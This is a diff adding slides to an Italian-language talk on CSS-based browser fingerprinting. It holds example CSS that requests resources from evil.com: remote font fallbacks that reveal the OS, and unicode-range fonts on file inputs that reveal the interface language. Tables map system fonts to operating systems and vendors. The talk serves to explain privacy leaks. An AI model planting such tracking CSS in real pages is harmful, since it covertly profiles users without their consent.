@@ -161,6 +161,125 @@ GET http://evil.com/spy.css HTTP/1.1
   .device-sniff {
     background-image: url(//evil.com/no-js.png);
   }}</code></pre>
-  <p-fragment class="landing" style="top: 30%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">💸</div></p-fragment>
+  <p-fragment class="landing" style="top: 30%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">🐟</div></p-fragment>
   <p-fragment class="landing" style="top: 60%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">❌</div></p-fragment>
+</p-slide>
+<p-slide>
+  <ul class="self-center">
+    <li>
+      <img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> device
+    </li>
+    <li>
+      <p-fragment><img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> OS</p-fragment>
+    </li>
+    <li>
+      <p-fragment><img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> browser</p-fragment>
+    </li>
+    <li>
+      <p-fragment><img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> lingua</p-fragment>
+    </li>
+  </ul>
+  <p-fragment>
+    <h2 class="center" style="margin-top: 1em;">Basta?</h2>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>@font-face {
+  font-family: Helvetica;
+  src: local('Helvetica')</code>
+    <p-fragment><code>url(http://evil.com/not-apple.ttf) format('ttf');</code></p-fragment>
+}</code></pre>
+</p-slide>
+<p-slide class="center">
+  <table>
+    <thead>
+      <tr>
+        <th style="border-bottom: .1em solid; padding: .5em;">Font</th>
+        <th style="border-bottom: .1em solid; padding: .5em;">OS</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Helvetica Neue, San Francisco</td>
+        <td><img src="img/apple.svg" alt="Apple" style="height: 1.5em"></td>
+      </tr>
+      <tr>
+        <td>Segoe UI, Tahoma</td>
+        <td><img src="img/windows.svg" alt="Windows" style="height: 1.5em"></td>
+      </tr>
+      <tr>
+        <td>Roboto, Droid Sans</td>
+        <td><img src="img/android.svg" alt="Android" style="height: 1.5em"></td>
+      </tr>
+      <tr>
+        <td>Ubuntu, Liberation Sans</td>
+        <td><img src="img/linux.svg" alt="Linux" style="height: 1.5em"></td>
+      </tr>
+      <tr>
+        <td>San Francisco Compact</td>
+        <td><img src="img/apple.svg" alt="Apple" style="height: 1.5em"> ⌚</td>
+      </tr>
+    </tbody>
+  </table>
+</p-slide>
+<p-slide class="center">
+  <table>
+    <thead>
+      <tr>
+        <th style="border-bottom: .1em solid; padding: .5em;">Font</th>
+        <th style="border-bottom: .1em solid; padding: .5em;">Produttore</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Gothic Bold</td>
+        <td>Samsung</td>
+      </tr>
+      <tr>
+        <td>ChakraPetch</td>
+        <td>Xiaomi</td>
+      </tr>
+      <tr>
+        <td>OnePlus Sans</td>
+        <td>OnePlus</td>
+      </tr>
+      <tr>
+        <td>LG Smart</td>
+        <td>LG</td>
+      </tr>
+      <tr>
+        <td>Furious Hello</td>
+        <td>Oppo</td>
+      </tr>
+    </tbody>
+  </table>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">Ulteriore traccia: font popolari</h3>
+  <ul class="center">
+    <li><img src="img/montserrat.png" alt="Esempio di font Montserrat" style="height: 1em;"></li>
+    <li><img src="img/open-sans.png" alt="Esempio di font Open-sans" style="height: 1em;"></li>
+    <li><img src="img/lato.png" alt="Esempio di font Lato" style="height: 1em;"></li>
+    <li><img src="img/raleway.png" alt="Esempio di font Raleway" style="height: 1em;"></li>
+    <li><img src="img/oswald.png" alt="Esempio di font Oswald" style="height: 1em;"></li>
+  </ul>
+</p-slide>
+<p-slide class="center">
+  <img src="img/input-type-file-fr.png" alt="input type='file' in francese" style="height: 1.5em;">
+  <img src="img/input-type-file-kr.png" alt="input type='file' in coreano" style="height: 1.5em;">
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center"><code>input[type="file"] { font-family: EvilSniff; }</code>
+
+<p-fragment><code>@font-face {
+  font-family: EvilSniff;
+  src: url(http://evil.com/fr.woff) format('woff');
+  unicode-range: U+00e9;
+}
+@font-face {
+  font-family: EvilSniff;
+  src: url(http://evil.com/kr.woff) format('woff');
+  unicode-range: U+c120;
+}
+...</code></p-fragment></pre>
 </p-slide>
